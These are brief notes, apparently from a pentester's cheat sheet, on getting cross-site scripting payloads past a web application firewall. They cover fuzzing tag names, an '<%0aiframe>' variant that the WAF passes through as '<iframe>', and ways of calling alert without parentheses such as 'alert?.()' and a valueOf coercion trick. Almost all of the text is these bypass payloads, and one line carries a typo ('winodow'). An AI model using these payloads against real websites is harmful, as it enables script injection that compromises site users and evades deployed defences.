# alert, prompt, etc are filtered

if you encountered WAF while adding HTML tags

## fuzz to find a valid tag

## `<ta{FUZZ}g>`

<iframe> -> 403
<%0aiframe> -> WAAF 200 -> server <iframe>

related to [fuzz JavaScript scheme](fuzz JS schemes)?

## [WAF confusion](WAF confusion)

# parenthesis, brackets, func(), etc are filtered

`1234()` // 200
`alert()` // 403 --> () are blocked

`alert?.()` // 200
`window.valueOf=alert;winodow+1` // 200
